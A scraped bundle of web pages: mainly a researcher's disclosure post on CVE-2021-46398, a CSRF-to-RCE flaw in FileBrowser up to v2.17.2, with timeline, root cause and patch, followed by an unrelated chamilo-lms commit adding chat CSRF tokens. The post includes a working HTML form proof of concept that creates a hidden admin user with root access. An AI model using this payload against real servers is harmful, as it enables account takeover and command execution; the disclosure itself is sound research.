![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_request.png?w=756)

**RCE:**

Refer:

<https://filebrowser.org/configuration/command-runner>

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/command-runner.png?w=855)

**PATCH**

Update to the latest version as the flaw has been patched from v2.18.0

Commit: <https://github.com/filebrowser/filebrowser/commit/74b7cd8e81840537a8206317344f118093153e8d>

**CVE-2021-46398**

**Thank you.**

Search for:

# Recent Posts

* [Privilege Escalation Vulnerability in Balena Etcher Software](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/)
* [CVE-2024-28739, CVE-2024-28740: XSS to One-Click RCE in Koha ILS](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/)
* [CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)
* [CVE-2023-44451, CVE-2023-52076: EPUB File Parsing Directory Traversal RCE Vulnerability affecting popular distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/)
* [Zip Path Traversal in Asus Smartphone’s default FileManager App.](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/)
# Recent Comments

# Archives

* [August 2024](https://febin0x4e4a.wordpress.com/2024/08/)
* [March 2024](https://febin0x4e4a.wordpress.com/2024/03/)
* [January 2024](https://febin0x4e4a.wordpress.com/2024/01/)
* [December 2023](https://febin0x4e4a.wordpress.com/2023/12/)
* [October 2023](https://febin0x4e4a.wordpress.com/2023/10/)
* [September 2023](https://febin0x4e4a.wordpress.com/2023/09/)
* [January 2023](https://febin0x4e4a.wordpress.com/2023/01/)
* [March 2022](https://febin0x4e4a.wordpress.com/2022/03/)
* [January 2022](https://febin0x4e4a.wordpress.com/2022/01/)
# Categories

* [Uncategorized](https://febin0x4e4a.wordpress.com/category/uncategorised/)

[Create a free website or blog at WordPress.com.](https://wordpress.com/?ref=footer_website)

* Subscribe
  Subscribed

  + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2022%2F01%2F19%2Fcritical-csrf-in-filebrowser%2F&signup_flow=account)
* Privacy
* + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2022%2F01%2F19%2Fcritical-csrf-in-filebrowser%2F&signup_flow=account)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://febin0x4e4a.wordpress.com)
  + [View site in Reader](https://wordpress.com/read/blogs/201901473)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

![](https://pixel.wp.com/b.gif?v=noscript)
Design a site like this with WordPress.com[Get started](https://wordpress.com/start/?ref=marketing_bar)


=== Content from febin0x4e4a.blogspot.com_96f17d7e_20250115_193650.html ===

[Skip to main content](#main)

### Search This Blog

# [FebiNJ](https://febin0x4e4a.blogspot.com/)

InfoSec Enthusiast

## Posts

Showing posts with the label CVE-2021–46398

[Show all](https://febin0x4e4a.blogspot.com/)

### [CVE-2021–46398 Critical CSRF to RCE in FileBrowser](https://febin0x4e4a.blogspot.com/2022/01/critical-csrf-in-filebrowser.html)

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

-

[January 17, 2022](https://febin0x4e4a.blogspot.com/2022/01/critical-csrf-in-filebrowser.html "permanent link")

![Image](https://lh3.googleusercontent.com/blogger_img_proxy/AEn0k_sKgoP1rB5xoHzrFBtRnWF-272HMYZ83og_rWZIL-Xk9h5pGiAbVhq7xJLMhAOXOIbGx_4ZW2phE350jFoabNmtUByU6tAbsx_Do_NOfFpr16A0uFcpysKJxa0_YQn0AO8cVFj7Yruh)

Introduction This is Febin , a security professional. I used to pick random opensource software for my research, recently I took some web-based file management software as my research targets. There I found some popular web-based file managers, one of them was a software named “FileBrowser”. While poking around I was able to find an awesome vulnerability in the application that leads to account takeover, complete access to the filesystem, and command execution. This article is going to be on that vulnerability. Disclosure Timeline: October 16, 2021 – Contacted the vendor and reported the vulnerability October 19, 2021 – Vendor replies back October 30, 2021 – Vulnerability has been patched in version v2.18.0 February 4, 2021 – CVE ID was assigned. CVE-2021-46398 Vendor/Software – Product Details Filebrowser provides a file managing interface within a specified directory and it can be used to upload, del...

[Post a Comment](https://febin0x4e4a.blogspot.com/2022/01/critical-csrf-in-filebrowser.html#comments)

[Read more](https://febin0x4e4a.blogspot.com/2022/01/critical-csrf-in-filebrowser.html "CVE-2021–46398 Critical CSRF to RCE in FileBrowser")

[More posts](https://febin0x4e4a.blogspot.com/search/label/CVE-2021%E2%80%9346398?updated-max=2022-01-17T06:56:00-08:00&max-results=20&start=20&by-date=false "More posts")

[Powered by Blogger](https://www.blogger.com)

### Labels

* [CVE-2021–46398](https://febin0x4e4a.blogspot.com/search/label/CVE-2021%E2%80%9346398)
* [Exploit](https://febin0x4e4a.blogspot.com/search/label/Exploit)
* [Hacking](https://febin0x4e4a.blogspot.com/search/label/Hacking)
* [Vulnerability Research](https://febin0x4e4a.blogspot.com/search/label/Vulnerability%20Research)

### [Report Abuse](https://www.blogger.com/go/report-abuse)



=== Content from febin0x4e4a.wordpress.com_7672aa02_20250115_193556.html ===

# [febiNJ](https://febin0x4e4a.wordpress.com/)

## InfoSec Enthusiast

Menu
[Skip to content](#content)

* [Home](https://febin0x4e4a.wordpress.com/)
* [About](https://febin0x4e4a.wordpress.com/about/)

Search

Search for:

# Critical CSRF in FileBrowser

[19th January 202222nd March 2022](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)

### CVE-2021-46398

**Introduction**

This is *Febin*, a security professional.

I used to pick random opensource software for my research, recently I took some web-based file management software as my research targets. There I found some popular web-based file managers, one of them was a software named “FileBrowser”. While poking around I was able to find an awesome vulnerability in the application that leads to account takeover, complete access to the filesystem, and command execution. This article is going to be on that vulnerability.

[![](https://raw.githubusercontent.com/filebrowser/logo/master/banner.png)](https://raw.githubusercontent.com/filebrowser/logo/master/banner.png)
[![](https://user-images.githubusercontent.com/5447088/50716739-ebd26700-107a-11e9-9817-14230c53efd2.gif)](https://user-images.githubusercontent.com/5447088/50716739-ebd26700-107a-11e9-9817-14230c53efd2.gif)

**Disclosure Timeline:**

October 16, 2021 – Contacted the vendor and reported the vulnerability

October 19, 2021 – Vendor replies back

October 30, 2021 – Vulnerability has been patched in version **v2.18.0**

February 4, 2022 – CVE ID was assigned. CVE-2021-46398

**Vendor/Software – Product Details**

Filebrowser provides a file managing interface within a specified directory and it can be used to upload, delete, preview, rename and edit your files. It allows the creation of multiple users and each user can have its own directory. It can be used as a standalone app or as a middleware.

Link**:** <https://filebrowser.org/>

**GitHub** **repo:** <https://github.com/filebrowser/filebrowser>

**The Vulnerability:** ***CSRF to RCE***

FileBrowser is a popular file manager/file managing interface developed in the Go language. Admin can create multiple users, even another Admin privileged user, and give access to any directory he wants, the user creation is handled by an endpoint “/api/users”.

The endpoint accepts input in JSON format to create users, but fails to verify that the “Content-Type” HTTP header, the Content-Type header’s value should be “application/json” but it accepts “text/plain” and that’s where the vulnerability arises. Also, the “Origin” is not validated and there are no anti-CSRF tokens implemented either.

Hence an attacker can easily exploit this vulnerability to create a backdoor user with admin privileges and access to the home directory or whichever directory the attacker wants to access, just by sending a malicious webpage URL to the legitimate admin and access the whole filesystem of the victim.

And an admin can run commands on the system, so this vulnerability leads to an RCE.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_request-1.png?w=756)

**Affected Versions: *v2.17.2 and below versions were affected. =< 2.17.2***

**Proof Of Concept:** **The below HTML code will exploit the Flaw**
<html>

<body style=”text-align:center;”>
  <h1> FileBrowser CSRF PoC by Febin </h1>
    <form action=”<http://ubuntu.local:8080/api/users>” method=”POST” enctype=”text/plain”>

<input type=”hidden” name='{“what”:”user”,”which”:[],”data”:{“scope”:”../../../../root/”,”locale”:”en”,”viewMode”:”mosaic”,”singleClick”:false,”sorting”:{“by”:””,”asc”:false},”perm”:{“admin”:true,”execute”:true,”create”:true,”rename”:true,”modify”:true,”delete”:true,”share”:true,”download”:true},”commands”:[],”hideDotfiles”:false,”username”:”pwned”,”password”:””,”rules”:[{“allow”:true,”path”:”../”,”regex”:false,”regexp”:{“raw”:””}}],”lockPassword”:false,”id”:0,”password”:”pwned”}}’ value=’test’>
      <input type=”submit” value=”CLICK ME!”>
    </form>

</body>

</html>

**Exploit-DB:** <https://www.exploit-db.com/exploits/50717>

**1. I started a filebrowser instance inside my ubuntu VM**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fb_csrf.png?w=942)

**2. I hosted the exploit on a simple HTTP server inside my host OS.**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf1-1.png?w=1024)
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf2.png?w=1024)

**3. When I click the “CLICK ME!” button, it sends a POST request in the background towards the filebrowser URL  and that creates a backdoor user named “pwned” with access to the “/root/” directory.**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf3.png?w=648)
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf4.png?w=1024)

Logged in as pwned user.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_root.png?w=1024)

Root Cause:
1. X-Auth header is not validated properly

2. No Anti-CSRF token

3. Using content-type “text/plain” makes the attack possible

4. Origin header is not validated

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_request.png?w=756)

**RCE:**

Refer:

<https://filebrowser.org/configuration/command-runner>

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/command-runner.png?w=855)

**PATCH**

Update to the latest version as the flaw has been patched from v2.18.0

Commit: <https://github.com/filebrowser/filebrowser/commit/74b7cd8e81840537a8206317344f118093153e8d>

**CVE-2021-46398**

**Thank you.**

### Share this:

* [Twitter](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/?share=twitter "Click to share on Twitter")
* [Facebook](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/?share=facebook "Click to share on Facebook")
Like Loading...
### *Related*

[Uncategorized](https://febin0x4e4a.wordpress.com/category/uncategorised/)
[CVE-2021-46398](https://febin0x4e4a.wordpress.com/tag/cve-2021-46398/), [Exploit](https://febin0x4e4a.wordpress.com/tag/exploit/), [Hacking](https://febin0x4e4a.wordpress.com/tag/hacking/), [Security Research](https://febin0x4e4a.wordpress.com/tag/security-research/), [Vulnerability](https://febin0x4e4a.wordpress.com/tag/vulnerability/)

# Post navigation

[Tiny File Manager Authenticated RCE →](https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/)

### Leave a comment [Cancel reply](/2022/01/19/critical-csrf-in-filebrowser/#respond)

Δ

Search for:

# Recent Posts

* [Privilege Escalation Vulnerability in Balena Etcher Software](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/)
* [CVE-2024-28739, CVE-2024-28740: XSS to One-Click RCE in Koha ILS](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/)
* [CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)
* [CVE-2023-44451, CVE-2023-52076: EPUB File Parsing Directory Traversal RCE Vulnerability affecting popular distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/)
* [Zip Path Traversal in Asus Smartphone’s default FileManager App.](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/)
# Recent Comments

# Archives

* [August 2024](https://febin0x4e4a.wordpress.com/2024/08/)
* [March 2024](https://febin0x4e4a.wordpress.com/2024/03/)
* [January 2024](https://febin0x4e4a.wordpress.com/2024/01/)
* [December 2023](https://febin0x4e4a.wordpress.com/2023/12/)
* [October 2023](https://febin0x4e4a.wordpress.com/2023/10/)
* [September 2023](https://febin0x4e4a.wordpress.com/2023/09/)
* [January 2023](https://febin0x4e4a.wordpress.com/2023/01/)
* [March 2022](https://febin0x4e4a.wordpress.com/2022/03/)
* [January 2022](https://febin0x4e4a.wordpress.com/2022/01/)
# Categories

* [Uncategorized](https://febin0x4e4a.wordpress.com/category/uncategorised/)

[Create a free website or blog at WordPress.com.](https://wordpress.com/?ref=footer_website)

* [Comment](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/#respond)
* Reblog
* Subscribe
  Subscribed

  + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2022%2F01%2F19%2Fcritical-csrf-in-filebrowser%2F&signup_flow=account)
* Privacy
* + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2022%2F01%2F19%2Fcritical-csrf-in-filebrowser%2F&signup_flow=account)
  + [Copy shortlink](https://wp.me/pdF9Nn-2)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/)
  + [View post in Reader](https://wordpress.com/read/blogs/201901473/posts/2)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

%d

![](https://pixel.wp.com/b.gif?v=noscript)
Design a site like this with WordPress.com[Get started](https://wordpress.com/start/?ref=marketing_bar)



=== Content from github.com_ac1f91f4_20250115_193633.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fchamilo%2Fchamilo-lms%2Fcommit%2Fc75b06adb816565e63f0738c028bd870c49b4de)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fchamilo%2Fchamilo-lms%2Fcommit%2Fc75b06adb816565e63f0738c028bd870c49b4de)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=chamilo%2Fchamilo-lms)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[chamilo](/chamilo)
/
**[chamilo-lms](/chamilo/chamilo-lms)**
Public

* [Notifications](/login?return_to=%2Fchamilo%2Fchamilo-lms) You must be signed in to change notification settings
* [Fork
  487](/login?return_to=%2Fchamilo%2Fchamilo-lms)
* [Star
   821](/login?return_to=%2Fchamilo%2Fchamilo-lms)

* [Code](/chamilo/chamilo-lms)
* [Issues
  568](/chamilo/chamilo-lms/issues)
* [Pull requests
  31](/chamilo/chamilo-lms/pulls)
* [Discussions](/chamilo/chamilo-lms/discussions)
* [Actions](/chamilo/chamilo-lms/actions)
* [Projects
  0](/chamilo/chamilo-lms/projects)
* [Wiki](/chamilo/chamilo-lms/wiki)
* [Security](/chamilo/chamilo-lms/security)
* [Insights](/chamilo/chamilo-lms/pulse)

Additional navigation options

* [Code](/chamilo/chamilo-lms)
* [Issues](/chamilo/chamilo-lms/issues)
* [Pull requests](/chamilo/chamilo-lms/pulls)
* [Discussions](/chamilo/chamilo-lms/discussions)
* [Actions](/chamilo/chamilo-lms/actions)
* [Projects](/chamilo/chamilo-lms/projects)
* [Wiki](/chamilo/chamilo-lms/wiki)
* [Security](/chamilo/chamilo-lms/security)
* [Insights](/chamilo/chamilo-lms/pulse)

## Commit

[Permalink](/chamilo/chamilo-lms/commit/c75b06adb816565e63f0738c028bd870c49b4de9)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Social: Security token for chat and social wall

[Browse files](/chamilo/chamilo-lms/tree/c75b06adb816565e63f0738c028bd870c49b4de9)
Browse the repository at this point in the history

* Loading branch information

[![@AngelFQC](https://avatars.githubusercontent.com/u/1697880?s=40&v=4)](/AngelFQC)

[AngelFQC](/chamilo/chamilo-lms/commits?author=AngelFQC "View all commits by AngelFQC")
authored
Aug 9, 2021

1 parent
[140f587](/chamilo/chamilo-lms/commit/140f58709926a5c5fea5e49f35be1acba433821d)

commit c75b06a

 Show file tree

 Hide file tree

Showing
**6 changed files**
with
**114 additions**
and
**73 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* main

  + inc/lib

    - main/inc/lib/chat.lib.php
      [chat.lib.php](#diff-45e36244906473bdd88a9587b8c7202b0300c26b3ce629a0faf594caf4164d92)
    - javascript/chat/js

      * main/inc/lib/javascript/chat/js/chat.js
        [chat.js](#diff-d38add267878c002ea9d90d1626213081baf408e5e0b59f4857ec0a84dbbb766)
    - main/inc/lib/security.lib.php
      [security.lib.php](#diff-96c3f8c89e0b312229186133ae7e9f2516f1b4165a21d6c219702f880eabe752)
    - main/inc/lib/social.lib.php
      [social.lib.php](#diff-007619523dcf9b5a272aa5e884a397f5962130c4765c2ee2d4c4e5c37dc5accf)
  + social

    - main/social/home.php
      [home.php](#diff-6c2dbcf81cbf5d4aae5690663204c4ca9569d42cd5a181a64bd15187dfca8f2b)
    - main/social/profile.php
      [profile.php](#diff-5b04a72120510239ee70b95293c1388087a5d96124633cbe29754da386d897f9)

## There are no files selected for viewing

12 changes: 11 additions & 1 deletion

12
[main/inc/lib/chat.lib.php](#diff-45e36244906473bdd88a9587b8c7202b0300c26b3ce629a0faf594caf4164d92 "main/inc/lib/chat.lib.php")

Show comments

[View file](/chamilo/chamilo-lms/blob/c75b06adb816565e63f0738c028bd870c49b4de9/main/inc/lib/chat.lib.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -142,6 +142,7 @@ public function startSession() |
|  |  | 'me' => get\_lang('Me'), |
|  |  | 'user\_id' => api\_get\_user\_id(), |
|  |  | 'items' => $chats, |
|  |  | 'sec\_token' => Security::get\_token('chat'), |
|  |  | ]; |
|  |  | echo json\_encode($return); |
|  |  |  |
| Expand Down  Expand Up | | @@ -367,6 +368,13 @@ public function send( |
|  |  | ) { |
|  |  | $relation = SocialManager::get\_relation\_between\_contacts($fromUserId, $to\_user\_id); |
|  |  |  |
|  |  | if (!Security::check\_token('post', null, 'chat')) { |
|  |  | if ($printResult) { |
|  |  | echo '0'; |
|  |  | exit; |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | if (USER\_RELATION\_TYPE\_FRIEND == $relation) { |
|  |  | $now = api\_get\_utc\_datetime(); |
|  |  | $user\_info = api\_get\_user\_info($to\_user\_id, true); |
| Expand Down  Expand Up | | @@ -405,8 +413,10 @@ public function send( |
|  |  |  |
|  |  | if (!empty($fromUserId) && !empty($to\_user\_id)) { |
|  |  | $messageId = $this->save($params); |
|  |  |  |
|  |  | if ($printResult) { |
|  |  | echo $messageId; |
|  |  | header('Content-Type: application/json'); |
|  |  | echo json\_encode(['id' => $messageId, 'sec\_token' => Security::get\_token('chat')]); |
|  |  | exit; |
|  |  | } |
|  |  | } |
| Expand Down | |  |

12 changes: 8 additions & 4 deletions

12
[main/inc/lib/javascript/chat/js/chat.js](#diff-d38add267878c002ea9d90d1626213081baf408e5e0b59f4857ec0a84dbbb766 "main/inc/lib/javascript/chat/js/chat.js")

Show comments

[View file](/chamilo/chamilo-lms/blob/c75b06adb816565e63f0738c028bd870c49b4de9/main/inc/lib/javascript/chat/js/chat.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -39,6 +39,7 @@ var user\_status = 0; |
|  |  | var widthBox = 320; // see css class .chatbox |
|  |  | //var ajax\_url = 'chat.php'; // This variable is loaded in the template/layout/head.tpl file |
|  |  | var doubleCheck = '<span class="chatbox\_checked"><i class="fa fa-check"></i><i class="fa fa-check"></i></span>'; |
|  |  | var currentToken = ''; |
|  |  |  |
|  |  | function set\_user\_status(status) |
|  |  | { |
| Expand Down  Expand Up | | @@ -134,6 +135,7 @@ function startChatSession() |
|  |  | dataType: "json", |
|  |  | success: function(data) { |
|  |  | if (data) { |
|  |  | currentToken = data.sec\_token; |
|  |  | username = data.me; |
|  |  | currentUserId = data.user\_id; |
|  |  | user\_status = data.user\_status; |
| Expand Down  Expand Up | | @@ -901,24 +903,26 @@ function checkChatBoxInputKey(event, chatboxtextarea, user\_id) |
|  |  | if (message != '') { |
|  |  | $.post(ajax\_url + "?action=sendchat", { |
|  |  | to: user\_id, |
|  |  | message: message |
|  |  | message: message, |
|  |  | chat\_sec\_token: currentToken |
|  |  | }, function (messageId) { |
|  |  | if (messageId > 0) { |
|  |  | if (messageId.id > 0) { |
|  |  | currentToken = messageId.sec\_token; |
|  |  | message = message.replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/\"/g, "&quot;"); |
|  |  | var item = { |
|  |  | from\_user\_info : {id: currentUserId, complete\_name: 'me'}, |
|  |  | username: username, |
|  |  | date: moment().unix(), |
|  |  | f: currentUserId, |
|  |  | message: message, |
|  |  | id: messageId |
|  |  | id: messageId.id |
|  |  | }; |
|  |  | createChatBubble(user\_id, item); |
|  |  | $("#chatbox\_" + user\_id + " .chatboxcontent").scrollTop( |
|  |  | $("#chatbox\_" + user\_id + " .chatboxcontent")[0].scrollHeight |
|  |  | ); |
|  |  |  |
|  |  | intervals[messageId] = setInterval(checkMessageStatus, chatHeartbeatTime, messageId); |
|  |  | intervals[messageId.id] = setInterval(checkMessageStatus, chatHeartbeatTime, messageId.id); |
|  |  | } else { |
|  |  | $("#chatbox\_" + user\_id + " .chatboxcontent"). |
|  |  | append('<i class="fa fa-exclamation-triangle" aria-hidden="true"></i><br />'); |
| Expand Down | |  |

51 changes: 34 additions & 17 deletions

51
[main/inc/lib/security.lib.php](#diff-96c3f8c89e0b312229186133ae7e9f2516f1b4165a21d6c219702f880eabe752 "main/inc/lib/security.lib.php")

Show comments

[View file](/chamilo/chamilo-lms/blob/c75b06adb816565e63f0738c028bd870c49b4de9/main/inc/lib/security.lib.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -131,9 +131,11 @@ public static function filter\_filename($filename) |
|  |  | /\*\* |
|  |  | \* @return string |
|  |  | \*/ |
|  |  | public static function getTokenFromSession() |
|  |  | public static function getTokenFromSession(string $prefix = '') |
|  |  | { |
|  |  | return Session::read('sec\_token'); |
|  |  | $secTokenVariable = self::generateSecTokenVariable($prefix); |
|  |  |  |
|  |  | return Session::read($secTokenVariable); |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
| Expand All | | @@ -144,24 +146,25 @@ public static function getTokenFromSession() |
|  |  | \* |
|  |  | \* @return bool True if it's the right token, false otherwise |
|  |  | \*/ |
|  |  | public static function check\_token($request\_type = 'post', FormValidator $form = null) |
|  |  | public static function check\_token($request\_type = 'post', FormValidator $form = null, string $prefix = '') |
|  |  | { |
|  |  | $sessionToken = Session::read('sec\_token'); |
|  |  | $secTokenVariable = self::generateSecTokenVariable($prefix); |
|  |  | $sessionToken = Session::read($secTokenVariable); |
|  |  | switch ($request\_type) { |
|  |  | case 'request': |
|  |  | if (!empty($sessionToken) && isset($\_REQUEST['sec\_token']) && $sessionToken === $\_REQUEST['sec\_token']) { |
|  |  | if (!empty($sessionToken) && isset($\_REQUEST[$secTokenVariable]) && $sessionToken === $\_REQUEST[$secTokenVariable]) { |
|  |  | return true; |
|  |  | } |
|  |  |  |
|  |  | return false; |
|  |  | case 'get': |
|  |  | if (!empty($sessionToken) && isset($\_GET['sec\_token']) && $sessionToken === $\_GET['sec\_token']) { |
|  |  | if (!empty($sessionToken) && isset($\_GET[$secTokenVariable]) && $sessionToken === $\_GET[$secTokenVariable]) { |
|  |  | return true; |
|  |  | } |
|  |  |  |
|  |  | return false; |
|  |  | case 'post': |
|  |  | if (!empty($sessionToken) && isset($\_POST['sec\_token']) && $sessionToken === $\_POST['sec\_token']) { |
|  |  | if (!empty($sessionToken) && isset($\_POST[$secTokenVariable]) && $sessionToken === $\_POST[$secTokenVariable]) { |
|  |  | return true; |
|  |  | } |
|  |  |  |
| Expand Down  Expand Up | | @@ -206,9 +209,11 @@ public static function check\_ua() |
|  |  | /\*\* |
|  |  | \* Clear the security token from the session. |
|  |  | \*/ |
|  |  | public static function clear\_token() |
|  |  | public static function clear\_token(string $prefix = '') |
|  |  | { |
|  |  | Session::erase('sec\_token'); |
|  |  | $secTokenVariable = self::generateSecTokenVariable($prefix); |
|  |  |  |
|  |  | Session::erase($secTokenVariable); |
